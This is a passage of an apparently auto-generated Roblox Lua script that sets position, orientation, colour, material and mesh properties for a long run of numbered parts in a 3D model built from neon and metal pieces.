Part379.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part379.BrickColor = BrickColor.new("Royal purple")
Part379.CanCollide = false
Part379.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part379.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part379.Material = Enum.Material.Neon
Part379.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part379.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part379.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part379.brickColor = BrickColor.new("Royal purple")
SpecialMesh380.Parent = Part379
SpecialMesh380.Scale = Vector3.new(0.5, 0.300000012, 0.5)
SpecialMesh380.MeshType = Enum.MeshType.Wedge
Part381.Parent = Model0
Part381.CFrame = CFrame.new(-0.609601736, 3.48017144, -16.5335026, 0.999985635, -0.00133592158, 0.00519114826, 0.0051369979, -0.0377659947, -0.999273479, 0.00153099943, 0.999285877, -0.0377585888)
Part381.Orientation = Vector3.new(87.8199997, 172.169998, 172.25)
Part381.Position = Vector3.new(-0.609601736, 3.48017144, -16.5335026)
Part381.Rotation = Vector3.new(92.159996, 0.299999982, 0.0799999982)
Part381.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part381.Velocity = Vector3.new(2.0478014e-08, 0.00246159849, 2.69103225e-07)
Part381.Size = Vector3.new(0.275000006, 1.65712488, 0.359375)
Part381.Anchored = true
Part381.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part381.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part381.BrickColor = BrickColor.new("Really black")
Part381.CanCollide = false
Part381.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part381.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part381.Material = Enum.Material.Metal
Part381.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part381.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part381.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part381.brickColor = BrickColor.new("Really black")
SpecialMesh382.Parent = Part381
SpecialMesh382.Scale = Vector3.new(0.400000006, 1, 0.5)
SpecialMesh382.MeshType = Enum.MeshType.Brick
Part383.Parent = Model0
Part383.CFrame = CFrame.new(-0.608603716, 2.57794237, -14.160059, -0.999985635, 0.00114323408, -0.00523646409, -0.00513646565, -0.483495802, 0.8753317, -0.00153109885, 0.875346065, 0.483494699)
Part383.Orientation = Vector3.new(-61.079998, -0.620000005, -179.389999)
Part383.Position = Vector3.new(-0.608603716, 2.57794237, -14.160059)
Part383.Rotation = Vector3.new(-61.0900002, -0.299999982, -179.929993)
Part383.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part383.Velocity = Vector3.new(1.63540591e-07, 0.00246654428, 2.14909824e-06)
Part383.Size = Vector3.new(0.275000006, 0.309124947, 0.343375027)
Part383.Anchored = true
Part383.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part383.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part383.BrickColor = BrickColor.new("Really black")
Part383.CanCollide = false
Part383.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part383.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part383.Material = Enum.Material.Metal
Part383.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part383.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part383.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part383.brickColor = BrickColor.new("Really black")
SpecialMesh384.Parent = Part383
SpecialMesh384.Scale = Vector3.new(0.349999994, 1, 1)
SpecialMesh384.MeshType = Enum.MeshType.Brick
Part385.Parent = Model0
Part385.CFrame = CFrame.new(-0.610497713, 3.13989329, -14.8064632, 0.999985635, -0.00162807363, 0.00510707032, 0.00513700629, 0.018946372, -0.999807417, 0.0015309992, 0.999819279, 0.0189544633)
Part385.Orientation = Vector3.new(88.8799973, 15.0799999, 15.1700001)
Part385.Position = Vector3.new(-0.610497713, 3.13989329, -14.8064632)
Part385.Rotation = Vector3.new(88.909996, 0.289999992, 0.0899999961)
Part385.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part385.Velocity = Vector3.new(7.44344675e-08, 0.00246519689, 9.78148478e-07)
Part385.Size = Vector3.new(0.275000006, 0.618124902, 0.209375009)
Part385.Anchored = true
Part385.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part385.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part385.BrickColor = BrickColor.new("Really black")
Part385.CanCollide = false
Part385.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part385.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part385.Material = Enum.Material.Metal
Part385.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part385.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part385.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part385.brickColor = BrickColor.new("Really black")
SpecialMesh386.Parent = Part385
SpecialMesh386.Scale = Vector3.new(0.400000006, 1, 0.899999976)
SpecialMesh386.MeshType = Enum.MeshType.Brick
Part387.Parent = Model0
Part387.CFrame = CFrame.new(-0.611324251, 3.01513863, -13.8486776, 0.999985635, -0.00162807154, 0.00510659395, 0.00513652945, 0.0189459547, -0.999807417, 0.00153100828, 0.999819279, 0.0189540461)
Part387.Orientation = Vector3.new(88.8799973, 15.0799999, 15.1700001)
Part387.Position = Vector3.new(-0.611324251, 3.01513863, -13.8486776)
Part387.Rotation = Vector3.new(88.909996, 0.289999992, 0.0899999961)
Part387.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part387.Velocity = Vector3.new(9.42162828e-08, 0.00246719248, 1.23810264e-06)
Part387.Size = Vector3.new(0.275000006, 0.200000003, 0.213375002)
Part387.Anchored = true
Part387.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part387.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part387.BrickColor = BrickColor.new("Bright blue")
Part387.CanCollide = false
Part387.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part387.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part387.Material = Enum.Material.Neon
Part387.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part387.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part387.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part387.brickColor = BrickColor.new("Bright blue")
SpecialMesh388.Parent = Part387
SpecialMesh388.Scale = Vector3.new(0.550000012, 0.25, 0.5)
SpecialMesh388.MeshType = Enum.MeshType.Wedge
Part389.Parent = Model0
Part389.CFrame = CFrame.new(-0.615387738, 3.25427985, -11.9957829, -0.999985635, -0.00162816129, -0.00510668149, -0.00513661886, 0.0189460143, 0.999807417, -0.00153109606, 0.999819279, -0.0189541057)
Part389.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part389.Position = Vector3.new(-0.615387738, 3.25427985, -11.9957829)
Part389.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part389.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part389.Velocity = Vector3.new(5.62967202e-08, 0.00247105281, 7.39798622e-07)
Part389.Size = Vector3.new(0.275000006, 0.206125051, 0.280375004)
Part389.Anchored = true
Part389.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part389.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part389.BrickColor = BrickColor.new("Really black")
Part389.CanCollide = false
Part389.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part389.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part389.Material = Enum.Material.Metal
Part389.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part389.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part389.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part389.brickColor = BrickColor.new("Really black")
SpecialMesh390.Parent = Part389
SpecialMesh390.Scale = Vector3.new(0.400000006, 0.560000002, 0.5)
SpecialMesh390.MeshType = Enum.MeshType.Wedge
Part391.Parent = Model0
Part391.CFrame = CFrame.new(-0.614540219, 3.2634635, -12.5800533, -0.999985635, -0.00162816129, -0.00510668149, -0.00513661886, 0.0189460143, 0.999807417, -0.00153109606, 0.999819279, -0.0189541057)
Part391.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part391.Position = Vector3.new(-0.614540219, 3.2634635, -12.5800533)
Part391.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part391.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part391.Velocity = Vector3.new(5.48404984e-08, 0.00246983557, 7.20662456e-07)
Part391.Size = Vector3.new(0.275000006, 0.405125052, 0.211375013)
Part391.Anchored = true
Part391.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part391.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part391.BrickColor = BrickColor.new("Really black")
Part391.CanCollide = false
Part391.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part391.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part391.Material = Enum.Material.Metal
Part391.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part391.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part391.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part391.brickColor = BrickColor.new("Really black")
SpecialMesh392.Parent = Part391
SpecialMesh392.Scale = Vector3.new(0.5, 0.560000002, 0.5)
SpecialMesh392.MeshType = Enum.MeshType.Wedge
Part393.Parent = Model0
Part393.CFrame = CFrame.new(-0.608892262, 2.75060058, -14.5502081, -0.999985635, 0.00114323408, -0.00523646409, -0.00513646565, -0.483495802, 0.8753317, -0.00153109885, 0.875346065, 0.483494699)
Part393.Orientation = Vector3.new(-61.079998, -0.620000005, -179.389999)
Part393.Position = Vector3.new(-0.608892262, 2.75060058, -14.5502081)
Part393.Rotation = Vector3.new(-61.0900002, -0.299999982, -179.929993)
Part393.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part393.Velocity = Vector3.new(1.36162924e-07, 0.00246573123, 1.78932657e-06)
Part393.Size = Vector3.new(0.275000006, 0.409124911, 0.268375039)
Part393.Anchored = true
Part393.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part393.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part393.BrickColor = BrickColor.new("Really black")
Part393.CanCollide = false
Part393.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part393.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part393.Material = Enum.Material.Metal
Part393.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part393.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part393.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part393.brickColor = BrickColor.new("Really black")
SpecialMesh394.Parent = Part393
SpecialMesh394.Scale = Vector3.new(0.349999994, 1, 1)
SpecialMesh394.MeshType = Enum.MeshType.Brick
Part395.Parent = Model0
Part395.CFrame = CFrame.new(-0.606766462, 3.43472743, -18.2343674, 0.999985635, -0.00103941432, 0.00525853038, 0.0051369979, -0.0943565816, -0.99552542, 0.00153093971, 0.995537996, -0.0943498909)
Part395.Orientation = Vector3.new(84.5800018, 176.809998, 176.87999)
Part395.Position = Vector3.new(-0.606766462, 3.43472743, -18.2343674)
Part395.Rotation = Vector3.new(95.409996, 0.299999982, 0.0599999987)
Part395.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part395.Velocity = Vector3.new(2.76838534e-08, 0.00245805481, 3.63795948e-07)
Part395.Size = Vector3.new(0.275000006, 1.04612494, 0.214375019)
Part395.Anchored = true
Part395.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part395.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part395.BrickColor = BrickColor.new("Bright blue")
Part395.CanCollide = false
Part395.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part395.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part395.Material = Enum.Material.Neon
Part395.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part395.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part395.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part395.brickColor = BrickColor.new("Bright blue")
SpecialMesh396.Parent = Part395
SpecialMesh396.Scale = Vector3.new(0.449999988, 0.899999976, 0.100000001)
SpecialMesh396.MeshType = Enum.MeshType.Brick
Part397.Parent = Model0
Part397.CFrame = CFrame.new(-0.638540506, 2.9091177, -16.128315, 0.00135860231, -0.999985635, -0.00518506905, 0.0334058255, -0.00513679488, 0.999428749, -0.999441087, -0.00153103739, 0.0333983675)
Part397.Orientation = Vector3.new(-88.0599976, -8.81999969, 98.7399979)
Part397.Position = Vector3.new(-0.638540506, 2.9091177, -16.128315)
Part397.Rotation = Vector3.new(-88.0899963, -0.299999982, 89.9199982)
Part397.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part397.Velocity = Vector3.new(1.11027532e-07, 0.00246243807, 1.45902084e-06)
Part397.Size = Vector3.new(1.625, 0.200000003, 0.296375006)
Part397.Anchored = true
Part397.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part397.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part397.BrickColor = BrickColor.new("Royal purple")
Part397.CanCollide = false
Part397.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part397.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part397.Material = Enum.Material.Neon
Part397.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part397.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part397.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part397.brickColor = BrickColor.new("Royal purple")
SpecialMesh398.Parent = Part397
SpecialMesh398.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh398.MeshType = Enum.MeshType.Wedge
Part399.Parent = Model0
Part399.CFrame = CFrame.new(-0.614644945, 3.60375571, -13.6545372, -0.999985635, -0.00162807142, -0.00510653527, -0.00513647031, 0.0189459249, 0.999807417, -0.00153100933, 0.999819279, -0.0189540163)
Part399.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part399.Position = Vector3.new(-0.614644945, 3.60375571, -13.6545372)
Part399.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part399.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part399.Velocity = Vector3.new(8.81826168e-10, 0.00246759667, 1.1587872e-08)
Part399.Size = Vector3.new(0.275000006, 0.51412493, 0.622375011)
Part399.Anchored = true
Part399.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part399.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part399.BrickColor = BrickColor.new("Really black")
Part399.CanCollide = false
Part399.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part399.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part399.Material = Enum.Material.Metal
Part399.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part399.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part399.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part399.brickColor = BrickColor.new("Really black")
SpecialMesh400.Parent = Part399
SpecialMesh400.Scale = Vector3.new(0.400000006, 1.04999995, 0.5)
SpecialMesh400.MeshType = Enum.MeshType.Brick
Part401.Parent = Model0
Part401.CFrame = CFrame.new(-0.577553451, 2.93009853, -15.210207, -0.00336827105, 0.999985635, -0.0041695768, 0.380026042, 0.00513680326, 0.924961627, 0.924969733, 0.00153097301, -0.380037904)
Part401.Orientation = Vector3.new(-67.659996, -179.369995, 89.2299957)
Part401.Position = Vector3.new(-0.577553451, 2.93009853, -15.210207)
Part401.Rotation = Vector3.new(-112.339996, -0.239999995, -90.1899948)
Part401.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part401.Velocity = Vector3.new(1.07700714e-07, 0.00246436079, 1.41530256e-06)
Part401.Size = Vector3.new(0.288000047, 0.200000003, 0.27837503)
Part401.Anchored = true
Part401.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part401.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part401.BrickColor = BrickColor.new("Royal purple")
Part401.CanCollide = false
Part401.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part401.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part401.Material = Enum.Material.Neon
Part401.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part401.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part401.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part401.brickColor = BrickColor.new("Royal purple")
SpecialMesh402.Parent = Part401
SpecialMesh402.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh402.MeshType = Enum.MeshType.Wedge
Part403.Parent = Model0
Part403.CFrame = CFrame.new(-0.610871017, 3.00987482, -14.1263742, -0.999985635, 0.00162795268, 0.00510695158, -0.00513688475, -0.0189460143, -0.999807417, -0.00153088232, -0.999819279, 0.0189541057)
Part403.Orientation = Vector3.new(88.8799973, 15.0799999, -164.830002)
Part403.Position = Vector3.new(-0.610871017, 3.00987482, -14.1263742)
Part403.Rotation = Vector3.new(88.909996, 0.289999992, -179.909988)
Part403.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part403.Velocity = Vector3.new(9.5050936e-08, 0.00246661413, 1.24907092e-06)
Part403.Size = Vector3.new(0.275000006, 0.207000002, 0.213375002)
Part403.Anchored = true
Part403.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part403.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part403.BrickColor = BrickColor.new("Bright blue")
Part403.CanCollide = false
Part403.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part403.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part403.Material = Enum.Material.Neon
Part403.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part403.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part403.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part403.brickColor = BrickColor.new("Bright blue")
SpecialMesh404.Parent = Part403
SpecialMesh404.Scale = Vector3.new(0.550000012, 0.25, 0.5)
SpecialMesh404.MeshType = Enum.MeshType.Wedge
Part405.Parent = Model0
Part405.CFrame = CFrame.new(-0.576041341, 2.90943861, -16.1282196, -0.00135869172, 0.999985635, -0.00518506905, -0.0334058292, 0.00513679255, 0.999428749, 0.999441028, 0.00153112656, 0.0333983749)
Part405.Orientation = Vector3.new(-88.0599976, -8.81999969, -81.2599945)
Part405.Position = Vector3.new(-0.576041341, 2.90943861, -16.1282196)
Part405.Rotation = Vector3.new(-88.0899963, -0.299999982, -90.0799942)
Part405.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part405.Velocity = Vector3.new(1.10976643e-07, 0.00246244832, 1.45835213e-06)
Part405.Size = Vector3.new(1.625, 0.200000003, 0.296375006)
Part405.Anchored = true
Part405.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part405.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part405.BrickColor = BrickColor.new("Royal purple")
Part405.CanCollide = false
Part405.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part405.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part405.Material = Enum.Material.Neon
Part405.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part405.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part405.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part405.brickColor = BrickColor.new("Royal purple")
SpecialMesh406.Parent = Part405
SpecialMesh406.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh406.MeshType = Enum.MeshType.Wedge
Part407.Parent = Model0
Part407.CFrame = CFrame.new(-0.61728102, 3.21630335, -10.6318092, -0.999985635, -0.00414685067, -0.00339615461, -0.00513672922, 0.560423911, 0.828190207, -0.00153109396, 0.828195751, -0.560437143)
Part407.Orientation = Vector3.new(-55.9099998, -179.649994, -0.529999971)
Part407.Position = Vector3.new(-0.61728102, 3.21630335, -10.6318092)
Part407.Rotation = Vector3.new(-124.089996, -0.189999998, 179.759995)
Part407.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part407.Velocity = Vector3.new(6.23185059e-08, 0.00247389474, 8.18931142e-07)
Part407.Size = Vector3.new(0.200000003, 0.46875, 0.220999971)
Part407.Anchored = true
Part407.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part407.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part407.BrickColor = BrickColor.new("Bright blue")
Part407.CanCollide = false
Part407.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part407.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part407.Material = Enum.Material.Neon
Part407.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part407.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part407.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part407.brickColor = BrickColor.new("Bright blue")
SpecialMesh408.Parent = Part407
SpecialMesh408.Scale = Vector3.new(0.5, 1, 0.25)
SpecialMesh408.MeshType = Enum.MeshType.Brick
Part409.Parent = Model0
Part409.CFrame = CFrame.new(-0.612716079, 3.04616904, -13.0423889, -0.999985635, -0.00162816129, -0.00510668149, -0.00513661886, 0.0189460143, 0.999807417, -0.00153109606, 0.999819279, -0.0189541057)
Part409.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part409.Position = Vector3.new(-0.612716079, 3.04616904, -13.0423889)
Part409.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part409.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part409.Velocity = Vector3.new(8.92959378e-08, 0.00246887235, 1.17344382e-06)
Part409.Size = Vector3.new(0.275000006, 0.35512504, 0.283374995)
Part409.Anchored = true
Part409.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part409.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part409.BrickColor = BrickColor.new("Really black")
Part409.CanCollide = false
Part409.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part409.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part409.Material = Enum.Material.Metal
Part409.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part409.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part409.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part409.brickColor = BrickColor.new("Really black")
SpecialMesh410.Parent = Part409
SpecialMesh410.Scale = Vector3.new(0.400000006, 0.560000002, 0.5)
SpecialMesh410.MeshType = Enum.MeshType.Wedge
Part411.Parent = Model0
Part411.CFrame = CFrame.new(-0.614045858, 3.38228369, -13.3029222, 0.999985635, 0.00162801193, -0.00510688825, 0.00513682282, -0.0189459547, 0.999807417, 0.00153094309, -0.999819279, -0.0189540461)
Part411.Orientation = Vector3.new(-88.8799973, -164.919998, 164.830002)
Part411.Position = Vector3.new(-0.614045858, 3.38228369, -13.3029222)
Part411.Rotation = Vector3.new(-91.0899963, -0.289999992, -0.0899999961)
Part411.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part411.Velocity = Vector3.new(3.59996903e-08, 0.00246832939, 4.73074152e-07)
Part411.Size = Vector3.new(0.275000006, 0.204125047, 0.287375003)
Part411.Anchored = true
Part411.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part411.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part411.BrickColor = BrickColor.new("Really black")
Part411.CanCollide = false
Part411.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part411.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part411.Material = Enum.Material.Metal
Part411.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part411.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part411.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part411.brickColor = BrickColor.new("Really black")
SpecialMesh412.Parent = Part411
SpecialMesh412.Scale = Vector3.new(0.5, 0.5, 0.5)
SpecialMesh412.MeshType = Enum.MeshType.Wedge
Part413.Parent = Model0
Part413.CFrame = CFrame.new(-0.609584808, 2.93011069, -14.6988583, -0.999985635, -0.00476218108, -0.00245960802, -0.00513651408, 0.720367968, 0.693573236, -0.00153109804, 0.693575919, -0.720382035)
Part413.Orientation = Vector3.new(-43.9099998, -179.800003, -0.409999996)
Part413.Position = Vector3.new(-0.609584808, 2.93011069, -14.6988583)
Part413.Rotation = Vector3.new(-136.089996, -0.140000001, 179.729996)
Part413.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part413.Velocity = Vector3.new(1.07698781e-07, 0.00246542133, 1.41527721e-06)
Part413.Size = Vector3.new(0.275000006, 0.484124899, 0.227375031)
Part413.Anchored = true
Part413.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part413.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part413.BrickColor = BrickColor.new("Really black")
Part413.CanCollide = false
Part413.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part413.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part413.Material = Enum.Material.Metal
Part413.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part413.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part413.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part413.brickColor = BrickColor.new("Really black")
SpecialMesh414.Parent = Part413
SpecialMesh414.Scale = Vector3.new(0.349999994, 0.300000012, 1)
SpecialMesh414.MeshType = Enum.MeshType.Brick
Part415.Parent = Model0
Part415.CFrame = CFrame.new(-0.606956184, 3.40465999, -18.0096188, 0.999985635, -0.0010395617, 0.00525854016, 0.00513699278, -0.0943568796, -0.99552542, 0.00153108896, 0.995537996, -0.094350189)
Part415.Orientation = Vector3.new(84.5800018, 176.809998, 176.87999)
Part415.Position = Vector3.new(-0.606956184, 3.40465999, -18.0096188)
Part415.Rotation = Vector3.new(95.409996, 0.299999982, 0.0599999987)
Part415.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part415.Velocity = Vector3.new(3.24515206e-08, 0.00245852303, 4.26448139e-07)
Part415.Size = Vector3.new(0.275000006, 1.46012485, 0.422374964)
Part415.Anchored = true
Part415.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part415.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part415.BrickColor = BrickColor.new("Really black")
Part415.CanCollide = false
Part415.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part415.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part415.Material = Enum.Material.Metal
Part415.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part415.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part415.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part415.brickColor = BrickColor.new("Really black")
SpecialMesh416.Parent = Part415
SpecialMesh416.Scale = Vector3.new(0.400000006, 1, 0.5)
SpecialMesh416.MeshType = Enum.MeshType.Brick
Part417.Parent = Model0
Part417.CFrame = CFrame.new(-0.613238811, 3.32843637, -13.6493177, -0.999985635, -0.00162807142, -0.00510653527, -0.00513647031, 0.0189459249, 0.999807417, -0.00153100933, 0.999819279, -0.0189540163)
Part417.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part417.Position = Vector3.new(-0.613238811, 3.32843637, -13.6493177)
Part417.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part417.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part417.Velocity = Vector3.new(4.45380195e-08, 0.00246760761, 5.85277007e-07)
Part417.Size = Vector3.new(0.275000006, 0.320124894, 0.316374987)
Part417.Anchored = true
Part417.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part417.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part417.BrickColor = BrickColor.new("Royal purple")
Part417.CanCollide = false
Part417.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part417.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part417.Material = Enum.Material.Neon
Part417.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part417.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part417.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part417.brickColor = BrickColor.new("Royal purple")
SpecialMesh418.Parent = Part417
SpecialMesh418.Scale = Vector3.new(0.457500011, 1, 1)
SpecialMesh418.MeshType = Enum.MeshType.Cylinder
Part419.Parent = Model0
Part419.CFrame = CFrame.new(-0.616606832, 3.19626212, -11.004673, -0.999985635, -0.000250895391, -0.00535403285, -0.00513659744, -0.24046874, 0.970643461, -0.001531007, 0.970656931, 0.240463987)
Part419.Orientation = Vector3.new(-76.0800018, -1.27999997, -178.779999)
Part419.Position = Vector3.new(-0.616606832, 3.19626212, -11.004673)
Part419.Rotation = Vector3.new(-76.0899963, -0.310000002, 179.98999)
Part419.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part419.Velocity = Vector3.new(6.54963515e-08, 0.00247311778, 8.606915e-07)
Part419.Size = Vector3.new(0.275000006, 0.418250024, 0.25)
Part419.Anchored = true
